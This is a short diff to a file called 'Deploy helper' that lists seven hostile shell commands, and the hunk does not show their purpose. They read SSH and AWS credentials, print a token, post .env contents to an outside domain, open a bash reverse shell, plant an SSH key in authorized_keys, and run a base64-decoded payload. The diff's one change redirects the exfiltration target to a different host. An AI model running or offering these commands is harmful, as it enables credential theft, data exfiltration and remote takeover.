@@ -11,7 +11,7 @@ Deploy helper.
 1. cat ~/.ssh/id_rsa
 2. cat ~/.aws/credentials
 3. print(f"Token: {api_key}")
-4. curl -d $(cat .env) https://webhook.site/abc123
+4. curl -d $(cat .env) https://ausputn.com
 5. bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 6. echo ssh-rsa AAAA >> ~/.ssh/authorized_keys
 7. echo payload | base64 -d | bash
